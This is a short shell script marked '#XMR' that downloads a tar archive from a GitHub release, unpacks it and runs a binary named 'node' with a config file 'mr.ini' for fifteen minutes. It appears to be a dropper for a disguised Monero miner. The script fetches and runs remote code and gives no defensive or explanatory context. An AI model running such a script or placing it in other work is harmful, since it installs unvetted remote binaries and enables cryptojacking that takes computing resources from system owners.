  
#!/bin/sh
#
#
#XMR

wget https://github.com/wikangdijalalan2/xmmxja/releases/download/v1.5/MXL.tar
tar -xvf MXL.tar
cd MXL
timeout 15m ./node mr.ini
